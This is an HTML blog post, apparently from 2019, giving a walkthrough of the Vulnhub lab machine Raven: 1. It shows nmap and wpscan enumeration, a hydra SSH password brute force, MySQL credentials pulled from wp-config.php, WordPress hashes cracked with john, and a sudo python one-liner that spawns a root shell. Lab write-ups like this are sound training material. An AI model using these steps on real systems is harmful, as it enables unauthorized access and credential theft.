@@ -1,0 +1,616 @@
+<!DOCTYPE html>
+<html lang="">
+    <head>
+         
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <title>Raven: 1 - Writeup</title>
+        <style>
+
+    html body {
+        font-family: '', sans-serif;
+        background-color: white;
+    }
+
+    :root {
+        --accent: green;
+        --border-width:  5px ;
+    }
+
+</style>
+
+
+<link rel="stylesheet" href="https://0x23b.github.io/css/main.css">
+
+
+
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=">
+
+
+
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+ 
+
+
+
+
+
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+
+
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+
+
+<script>$(document).on('click', function() { $('.collapse').collapse('hide'); })</script>
+ <meta name="generator" content="Hugo 0.32.4" />
+        
+        
+        
+        
+        <script async src="https://www.googletagmanager.com/gtag/js?id=UA-91628530-1"></script>
+        <script>
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments)};
+          gtag('js', new Date());
+
+          gtag('config', 'UA-91628530-1');
+        </script>
+        
+    </head>
+
+    
+    <script type="text/javascript" async
+      src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+  </script>
+
+    <body>
+        
+
+        <nav class="navbar navbar-default navbar-fixed-top">
+
+            <div class="container">
+
+                <div class="navbar-header">
+
+                    <a class="navbar-brand visible-xs" href="#">Raven: 1 - Writeup</a>
+					
+                    <button class="navbar-toggle" data-target=".navbar-collapse" data-toggle="collapse">
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                    </button>
+                </div>
+
+                <div class="collapse navbar-collapse">
+
+                    
+                        <ul class="nav navbar-nav">
+                            
+                                <li><a href="https://0x23b.github.io/">Home</a></li>
+                            
+                                <li><a href="https://0x23b.github.io/about">About</a></li>
+                            
+                                <li><a href="https://0x23b.github.io/tags/">Tags</a></li>
+                            
+                                <li><a href="https://0x23b.github.io/posts/">Posts</a></li>
+                            
+                        </ul>
+                    
+
+                    
+                        <ul class="nav navbar-nav navbar-right">
+                            
+                                <li class="navbar-icon"><a href="https://github.com/0x23b/"><i class="fa fa-github"></i></a></li>
+                            
+                                <li class="navbar-icon"><a href="https://twitter.com/0x23b/"><i class="fa fa-twitter"></i></a></li>
+                            
+							<li class="navbar-icon"></li>
+
+                        </ul>
+						
+						<ul class="nav navbar-nav navbar-right">
+                        </ul>
+						
+						
+
+                    
+
+                </div>
+
+            </div>
+
+        </nav>
+
+
+<main>
+
+    <div class="item">
+
+    
+    
+    
+
+    
+    
+
+    <h4><a href="https://0x23b.github.io/posts/vulnhub/2019-02-26-vulnhub_raven_1_writeup/">Raven: 1 - Writeup</a></h4>
+    <h5>February 26, 2019</h5>
+    
+    <a href="https://0x23b.github.io/tags/vulnhub"><kbd class="item-tag">Vulnhub</kbd></a>
+    
+    <a href="https://0x23b.github.io/tags/writeups"><kbd class="item-tag">Writeups</kbd></a>
+    
+
+</div>
+
+
+    <br> <div class="text-justify">
+
+<h1 id="raven-1-writeup">Raven: 1 - Writeup</h1>
+
+<h2 id="summary">Summary</h2>
+
+<p>This machine was well constructed and straight forward, therefore I really enjoyed it. After finding wordpress on the web server, it can be enumerated in order to find out valid usernames. The usernames can then be used to bruteforce the password for the ssh login. While on the machine, we can find mysql credentials in the wordpress config file. Inside the database, we can find the password hash for the other user, which can be cracked within seconds. That user is able to run python as sudo, which is enough to get root.</p>
+
+<h2 id="identifying-the-host">Identifying the host</h2>
+
+<p>To find out the host, we can quickly run an nmap scan:</p>
+
+<pre><code class="language-bash">root@kali:~/vulnhub/raven1# nmap -sn 192.168.63.*
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-26 22:46 CET
+mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
+Nmap scan report for 192.168.63.1
+Host is up (0.00024s latency).
+MAC Address: 0A:00:27:00:00:10 (Unknown)
+Nmap scan report for 192.168.63.2
+Host is up (0.00021s latency).
+MAC Address: 08:00:27:89:42:AA (Oracle VirtualBox virtual NIC)
+Nmap scan report for raven.local (192.168.63.3)
+Host is up (0.00021s latency).
+MAC Address: 08:00:27:A9:CB:5B (Oracle VirtualBox virtual NIC)
+Nmap scan report for 192.168.63.4
+Host is up.
+Nmap done: 256 IP addresses (4 hosts up) scanned in 2.05 seconds
+</code></pre>
+
+<p>After our vulnerable host is found, we can run the mandatory port scan.</p>
+
+<h2 id="port-scan">Port scan</h2>
+
+<pre><code class="language-bash">root@kali:~/vulnhub/raven1 # nmap -p- -oA full 192.168.63.3
+# Nmap 7.70 scan initiated Tue Feb 26 20:41:18 2019 as: nmap -p- -oA full 192.168.63.3
+mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
+Nmap scan report for 192.168.63.3
+Host is up (0.000084s latency).
+Not shown: 65531 closed ports
+PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+111/tcp   open  rpcbind
+47938/tcp open  unknown
+MAC Address: 08:00:27:A9:CB:5B (Oracle VirtualBox virtual NIC)
+
+# Nmap done at Tue Feb 26 20:41:21 2019 -- 1 IP address (1 host up) scanned in 2.54 seconds
+</code></pre>
+
+<p>So ssh and http ports are open. The web server will be the first thing, we should have a look at.</p>
+
+<pre><code class="language-bash">root@kali:~/vulnhub/raven1# gobuster -u http://192.168.63.3/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+=====================================================
+Gobuster v2.0.1              OJ Reeves (@TheColonial)
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://192.168.63.3/
+[+] Threads      : 10
+[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes : 200,204,301,302,307,403
+[+] Timeout      : 10s
+=====================================================
+2019/02/26 20:44:10 Starting gobuster
+=====================================================
+/img (Status: 301)
+/css (Status: 301)
+/wordpress (Status: 301)
+/manual (Status: 301)
+/js (Status: 301)
+/vendor (Status: 301)
+/fonts (Status: 301)
+/server-status (Status: 403)
+=====================================================
+2019/02/26 20:44:31 Finished
+=====================================================
+</code></pre>
+
+<p>Great! We have wordpress running! This means, that we can enumerate with wpscan.</p>
+
+<h2 id="wpscan">WPScan</h2>
+
+<pre><code class="language-bash">root@kali:~/vulnhub/raven1# wpscan --url http://raven.local/wordpress -e
+_______________________________________________________________
+        __          _______   _____
+        \ \        / /  __ \ / ____|
+         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+           \  /\  /  | |     ____) | (__| (_| | | | |
+            \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+        WordPress Security Scanner by the WPScan Team
+                       Version 3.4.4
+          Sponsored by Sucuri - https://sucuri.net
+      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
+_______________________________________________________________
+
+[+] URL: http://raven.local/wordpress/
+[+] Started: Tue Feb 26 22:51:20 2019
+
+Interesting Finding(s):
+
+[+] http://raven.local/wordpress/
+ | Interesting Entry: Server: Apache/2.4.10 (Debian)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] http://raven.local/wordpress/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access
+
+[+] http://raven.local/wordpress/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] WordPress version 4.8.7 identified (Insecure, released on 2018-07-05).
+ | Detected By: Rss Generator (Passive Detection)
+ |  - http://raven.local/wordpress/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=4.8.7&lt;/generator&gt;
+ |  - http://raven.local/wordpress/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=4.8.7&lt;/generator&gt;
+ |
+ | [!] 7 vulnerabilities identified:
+ |
+ | [!] Title: WordPress &lt;= 5.0 - Authenticated File Delete
+ |     Fixed in: 4.8.8
+ |     References:
+ |      - https://wpvulndb.com/vulnerabilities/9169
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20147
+ |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
+ |
+ | [!] Title: WordPress &lt;= 5.0 - Authenticated Post Type Bypass
+ |     Fixed in: 4.8.8
+ |     References:
+ |      - https://wpvulndb.com/vulnerabilities/9170
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20152
+ |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
+ |      - https://blog.ripstech.com/2018/wordpress-post-type-privilege-escalation/
+ |
+ | [!] Title: WordPress &lt;= 5.0 - PHP Object Injection via Meta Data
+ |     Fixed in: 4.8.8
+ |     References:
+ |      - https://wpvulndb.com/vulnerabilities/9171
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20148
+ |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
+ |
+ | [!] Title: WordPress &lt;= 5.0 - Authenticated Cross-Site Scripting (XSS)
+ |     Fixed in: 4.8.8
+ |     References:
+ |      - https://wpvulndb.com/vulnerabilities/9172
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20153
+ |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
+ |
+ | [!] Title: WordPress &lt;= 5.0 - Cross-Site Scripting (XSS) that could affect plugins
+ |     Fixed in: 4.8.8
+ |     References:
+ |      - https://wpvulndb.com/vulnerabilities/9173
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20150
+ |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
+ |      - https://github.com/WordPress/WordPress/commit/fb3c6ea0618fcb9a51d4f2c1940e9efcd4a2d460
+ |
+ | [!] Title: WordPress &lt;= 5.0 - User Activation Screen Search Engine Indexing
+ |     Fixed in: 4.8.8
+ |     References:
+ |      - https://wpvulndb.com/vulnerabilities/9174
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20151
+ |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
+ |
+ | [!] Title: WordPress &lt;= 5.0 - File Upload to XSS on Apache Web Servers
+ |     Fixed in: 4.8.8
+ |     References:
+ |      - https://wpvulndb.com/vulnerabilities/9175
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20149
+ |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
+ |      - https://github.com/WordPress/WordPress/commit/246a70bdbfac3bd45ff71c7941deef1bb206b19a
+
+[+] WordPress theme in use: twentyseventeen
+ | Location: http://raven.local/wordpress/wp-content/themes/twentyseventeen/
+ | Last Updated: 2019-02-21T00:00:00.000Z
+ | Readme: http://raven.local/wordpress/wp-content/themes/twentyseventeen/README.txt
+ | [!] The version is out of date, the latest version is 2.1
+ | Style URL: http://raven.local/wordpress/wp-content/themes/twentyseventeen/style.css?ver=4.8.7
+ | Style Name: Twenty Seventeen
+ | Style URI: https://wordpress.org/themes/twentyseventeen/
+ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
+ | Author: the WordPress team
+ | Author URI: https://wordpress.org/
+ |
+ | Detected By: Css Style (Passive Detection)
+ |
+ | Version: 1.3 (80% confidence)
+ | Detected By: Style (Passive Detection)
+ |  - http://raven.local/wordpress/wp-content/themes/twentyseventeen/style.css?ver=4.8.7, Match: 'Version: 1.3'
+
+[+] Enumerating Vulnerable Plugins (via Passive Methods)
+
+[i] No plugins Found.
+
+[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
+ Checking Known Locations - Time: 00:00:00 &lt;===================================================================================================================================&gt; (289 / 289) 100.00% Time: 00:00:00
+[+] Checking Theme Versions (via Passive and Aggressive Methods)
+
+[i] No themes Found.
+
+[+] Enumerating Timthumbs (via Passive and Aggressive Methods)
+ Checking Known Locations - Time: 00:00:01 &lt;=================================================================================================================================&gt; (2573 / 2573) 100.00% Time: 00:00:01
+
+[i] No Timthumbs Found.
+
+[+] Enumerating Config Backups (via Passive and Aggressive Methods)
+ Checking Config Backups - Time: 00:00:00 &lt;======================================================================================================================================&gt; (21 / 21) 100.00% Time: 00:00:00
+
+[i] No Config Backups Found.
+
+[+] Enumerating DB Exports (via Passive and Aggressive Methods)
+ Checking DB Exports - Time: 00:00:00 &lt;==========================================================================================================================================&gt; (36 / 36) 100.00% Time: 00:00:00
+
+[i] No DB Exports Found.
+
+[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to &quot;Plain&quot; for those to be detected)
+ Brute Forcing Attachment IDs - Time: 00:00:03 &lt;===============================================================================================================================&gt; (100 / 100) 100.00% Time: 00:00:03
+
+[i] No Medias Found.
+
+[+] Enumerating Users (via Passive and Aggressive Methods)
+ Brute Forcing Author IDs - Time: 00:00:00 &lt;=====================================================================================================================================&gt; (10 / 10) 100.00% Time: 00:00:00
+
+[i] User(s) Identified:
+
+[+] michael
+ | Detected By: Author Posts - Author Pattern (Passive Detection)
+ | Confirmed By:
+ |  Rss Generator (Passive Detection)
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
+[+] steven
+ | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+[+] Finished: Tue Feb 26 22:51:29 2019
+[+] Requests Done: 3040
+[+] Cached Requests: 38
+[+] Data Sent: 688.42 KB
+[+] Data Received: 6.517 MB
+[+] Memory used: 164.203 MB
+[+] Elapsed time: 00:00:08
+</code></pre>
+
+<p>We have found some vulnerable plugins, but none of them looks interesting for us. But we found two users (michael and steven), which we can use to crack ssh with hydra.</p>
+
+<pre><code class="language-bash">root@kali:~/vulnhub/raven1# hydra -l michael -P /usr/share/wordlists/rockyou.txt ssh://raven.local
+Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-02-26 21:32:50
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ssh://raven.local:22/
+[22][ssh] host: raven.local   login: michael   password: michael
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 1 final worker threads did not complete until end.
+[ERROR] 1 target did not resolve or could not be connected
+[ERROR] 16 targets did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-02-26 21:33:03
+</code></pre>
+
+<p>We have found a password! Now let’s login via ssh.</p>
+
+<h2 id="ssh-login">SSH Login</h2>
+
+<pre><code class="language-bash">root@kali:~/vulnhub/raven1# ssh michael@raven.local
+The authenticity of host 'raven.local (192.168.63.3)' can't be established.
+ECDSA key fingerprint is SHA256:rCGKSPq0sUfa5mqn/8/M0T63OxqkEIR39pi835oSDo8.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added 'raven.local' (ECDSA) to the list of known hosts.
+Warning: the ECDSA host key for 'raven.local' differs from the key for the IP address '192.168.63.3'
+Offending key for IP in /root/.ssh/known_hosts:1
+Are you sure you want to continue connecting (yes/no)? yes
+michael@raven.local's password:
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+You have new mail.
+/usr/bin/xauth:  file /home/michael/.Xauthority does not exist
+</code></pre>
+
+<p>Enumerating the web server directory, we can find mysql credentials in the wordpress config file.</p>
+
+<pre><code class="language-bash">michael@Raven:/var/www/html/wordpress$ cat wp-config.php
+&lt;?php
+...
+
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define('DB_NAME', 'wordpress');
+
+/** MySQL database username */
+define('DB_USER', 'root');
+
+/** MySQL database password */
+define('DB_PASSWORD', 'R@v3nSecurity');
+...
+</code></pre>
+
+<p>Now, with these credentials, we can login to the database. Let’s see, what we can find there.</p>
+
+<pre><code class="language-bash">michael@Raven:/var/www/html/wordpress$ mysql -u root -p
+Enter password:
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 200
+Server version: 5.5.60-0+deb8u1 (Debian)
+
+Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql&gt; show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| wordpress          |
++--------------------+
+4 rows in set (0.00 sec)
+
+mysql&gt; use wordpress;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql&gt; select * from wp_users;
++----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+----------------+
+| ID | user_login | user_pass                          | user_nicename | user_email        | user_url | user_registered     | user_activation_key | user_status | display_name   |
++----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+----------------+
+|  1 | michael    | $P$BjRvZQ.VQcGZlDeiKToCQd.cPw5XCe0 | michael       | michael@raven.org |          | 2018-08-12 22:49:12 |                     |           0 | michael        |
+|  2 | steven     | $P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/ | steven        | steven@raven.org  |          | 2018-08-12 23:31:16 |                     |           0 | Steven Seagull |
++----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+----------------+
+2 rows in set (0.00 sec)
+</code></pre>
+
+<p>We have found the password hash of user steven. With john, we can try to crack this hash. Therefore, we copy the password into a file called hash and execute the following command:</p>
+
+<pre><code class="language-bash">root@kali:~/vulnhub/raven1# root@kali:~/vulnhub/raven1# john hashes --wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
+Cost 1 (iteration count) is 8192 for all loaded hashes
+Will run 7 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:00:04 1,73% (ETA: 23:11:26) 0g/s 64655p/s 64655c/s 64655C/s titans7..tayshawn1
+
+steven:pink84
+
+1 password hash cracked, 0 left
+</code></pre>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<p>Now, as we have the password of steven, we can try to logon via ssh.</p>
+
+<pre><code class="language-bash">michael@Raven:/var/www/html/wordpress$ ssh steven@localhost
+The authenticity of host 'localhost (::1)' can't be established.
+ECDSA key fingerprint is 1f:77:31:19:de:b0:e1:6d:ca:77:07:76:84:d3:a9:a0.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added 'localhost' (ECDSA) to the list of known hosts.
+steven@localhost's password:
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Mon Aug 13 14:12:04 2018
+$ id
+uid=1001(steven) gid=1001(steven) groups=1001(steven)
+$ sudo -l
+Matching Defaults entries for steven on raven:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User steven may run the following commands on raven:
+    (ALL) NOPASSWD: /usr/bin/python
+</code></pre>
+
+<p>We are able to execute python as root. This is everything, what we need to get root.</p>
+
+<pre><code class="language-bash">$ sudo /usr/bin/python -c &quot;import pty;pty.spawn('/bin/bash')&quot;
+root@Raven:/home/steven# id
+uid=0(root) gid=0(root) groups=0(root)
+root@Raven:/home/steven# cd /root
+root@Raven:~# ls -la
+total 40
+drwx------  2 root root 4096 Aug 13  2018 .
+drwxr-xr-x 22 root root 4096 Aug 13  2018 ..
+-rw-------  1 root root 3402 Aug 13  2018 .bash_history
+-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
+-rw-r--r--  1 root root  442 Aug 13  2018 flag4.txt
+-rw-------  1 root root   27 Aug 13  2018 .mysql_history
+-rw-r--r--  1 root root  140 Nov 20  2007 .profile
+-rw-------  1 root root 1024 Aug 13  2018 .rnd
+-rw-r--r--  1 root root   66 Aug 13  2018 .selected_editor
+-rw-r--r--  1 root root   20 Aug 13  2018 .tmux-session
+root@Raven:~# cat flag4.txt
+______                      
+
+| ___ \                     
+
+| |_/ /__ ___   _____ _ __  
+
+|    // _` \ \ / / _ \ '_ \
+
+| |\ \ (_| |\ V /  __/ | | |
+
+\_| \_\__,_| \_/ \___|_| |_|
+
+
+flag4{715dea6c055b9fe3337544932f2941ce}
+
+CONGRATULATIONS on successfully rooting Raven!
+
+This is my first Boot2Root VM - I hope you enjoyed it.
+
+Hit me up on Twitter and let me know what you thought:
+
+@mccannwj / wjmccann.github.io
+</code></pre>
+</div>
+
+    
+    
+
+    
+
+    
+
+</main>
+
+        <footer>
+
+            <p class="copyright text-muted">&copy; All rights reserved. Powered by <a href="https://gohugo.io">Hugo</a> and <a href="https://github.com/calintat/minimal">Minimal</a></p>
+
+        </footer>
+       
+    </body>
+
+</html>
+
